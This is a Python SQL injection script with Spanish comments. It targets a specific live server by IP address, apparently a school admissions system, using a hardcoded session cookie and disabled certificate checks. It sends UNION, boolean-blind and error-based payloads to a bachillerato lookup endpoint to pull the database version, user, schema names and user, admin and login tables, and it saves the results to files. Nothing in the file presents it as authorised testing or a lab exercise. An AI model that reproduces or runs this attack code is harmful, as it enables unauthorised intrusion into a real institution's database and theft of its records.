# smart_sql_exploit.py
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SmartSQLExploit:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.set('JSESSIONID', '3B0DDD39CD0068BB30ED28B8C75B2A38')
        
    def exploit_union_based(self):
        """Explotación UNION usando valores válidos como base"""
        print("=== EXPLOTACIÓN SQL INTELIGENTE ===")
        
        endpoint = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        # Primero, entender la estructura de la consulta
        print("[+] Analizando estructura de datos...")
        
        # Probar valores válidos para entender el formato
        valid_values = ["1", "2", "3", "10", "100", "999"]
        for value in valid_values:
            url = f"{self.base_url}{endpoint}?xCveBachillerato={value}"
            response = self.session.get(url)
            if response.status_code == 200:
                content = response.text.strip()
                print(f"Valor {value}: '{content}'")
                
                # Analizar el formato
                if "¬" in content:
                    parts = content.split("¬")
                    print(f"  Formato: ID={parts[0]}, Nombre={parts[1]}")
        
        # Ahora usar UNION con la misma estructura
        print("\n[+] Probando UNION SELECT con estructura correcta...")
        
        # Basado en el formato: ID¬NOMBRE
        union_payloads = [
            # Mantener el mismo formato que la consulta original
            "1 UNION SELECT '1000','TEST' FROM DUAL--",
            "1 UNION SELECT '1001','test1' FROM DUAL--",
            "1 UNION SELECT '1002','test2' FROM DUAL--",
            
            # Extraer información del sistema
            "1 UNION SELECT @@version,@@hostname--",
            "1 UNION SELECT user(),database()--",
            "1 UNION SELECT @@version,database()--",
            
            # Extraer información de la BD
            "1 UNION SELECT schema_name,'test' FROM information_schema.schemata--",
            "1 UNION SELECT table_name,table_schema FROM information_schema.tables--",
            
            # Buscar tablas de usuarios
            "1 UNION SELECT '1003',table_name FROM information_schema.tables WHERE table_name LIKE '%user%'--",
            "1 UNION SELECT '1004',table_name FROM information_schema.tables WHERE table_name LIKE '%admin%'--",
            "1 UNION SELECT '1005',table_name FROM information_schema.tables WHERE table_name LIKE '%login%'--",
            
            # Si falla, probar con diferentes sintaxis
            "1 UNION SELECT '1006','test6'-- -",
            "1 UNION SELECT '1007','test7'#",
        ]
        
        for payload in union_payloads:
            self.test_payload(endpoint, payload)
    
    def test_payload(self, endpoint, payload):
        """Prueba un payload específico"""
        url = f"{self.base_url}{endpoint}?xCveBachillerato={payload}"
        try:
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                content = response.text.strip()
                print(f"\n✅ Payload exitoso: {payload}")
                print(f"   Respuesta: '{content}'")
                
                # Guardar respuesta exitosa
                if content and "¬" in content:
                    filename = f"sql_success_{hash(payload)}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(f"Payload: {payload}\n")
                        f.write(f"Response: {content}\n")
                    print(f"   💾 Guardado: {filename}")
                    
            elif response.status_code == 404:
                # Error esperado para SQL injection
                print(f"❌ 404 Error con: {payload[:50]}...")
            else:
                print(f"⚠️  Status {response.status_code} con: {payload[:30]}...")
                
        except Exception as e:
            print(f"💥 Error con {payload[:30]}: {e}")
    
    def exploit_boolean_based(self):
        """Explotación basada en booleanos usando respuestas válidas"""
        print("\n[+] Probando Blind SQL Injection...")
        
        endpoint = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        # Usar el valor 1 (que sabemos que funciona) como base
        base_payloads = [
            "1 AND 1=1",
            "1 AND 1=2", 
            "1 OR 1=1",
            "1 OR 1=2",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ]
        
        for payload in base_payloads:
            url = f"{self.base_url}{endpoint}?xCveBachillerato={payload}"
            response = self.session.get(url)
            
            if response.status_code == 200:
                content = response.text.strip()
                if content and "¬" in content:
                    print(f"✅ Boolean true con: {payload}")
                else:
                    print(f"❌ Boolean false con: {payload}")
            else:
                print(f"⚠️  Error con: {payload}")
    
    def exploit_error_based(self):
        """Explotación basada en errores"""
        print("\n[+] Probando Error-Based SQL Injection...")
        
        endpoint = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        error_payloads = [
            "1 AND EXTRACTVALUE(1,CONCAT(0x3a,version()))",
            "1 AND UPDATEXML(1,CONCAT(0x3a,version()),1)",
            "1' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--",
            "1' AND UPDATEXML(1,CONCAT(0x3a,version()),1)--",
        ]
        
        for payload in error_payloads:
            url = f"{self.base_url}{endpoint}?xCveBachillerato={payload}"
            response = self.session.get(url)
            
            # En error-based, a veces los errores contienen información
            if response.status_code == 500:
                print(f"⚠️  Error 500 con: {payload[:40]}...")
                # Los errores pueden contener información de la BD
                if "SQL" in response.text or "mysql" in response.text.lower():
                    print("   🔍 Posible información en el error!")
    
    def exploit_second_endpoint(self):
        """Explota el segundo endpoint AJAX"""
        print("\n[+] Probando segundo endpoint AJAX...")
        
        endpoint = "/jsp/escolar/muestra_bachillerato_ajax.jsp"
        
        # Probar el mismo enfoque
        test_values = ["1", "2", "3"]
        
        for value in test_values:
            url = f"{self.base_url}{endpoint}?xCveBachillerato={value}"
            response = self.session.get(url)
            if response.status_code == 200:
                content = response.text.strip()
                print(f"Endpoint 2 - Valor {value}: '{content}'")
                
                # Analizar formato diferente (usa coma)
                if "," in content:
                    parts = content.split(",")
                    print(f"  Formato: ID={parts[0]}, Nombre={parts[1]}")

# Ejecutar
if __name__ == "__main__":
    exploit = SmartSQLExploit()
    exploit.exploit_union_based()
    exploit.exploit_boolean_based()
    exploit.exploit_error_based()
    exploit.exploit_second_endpoint()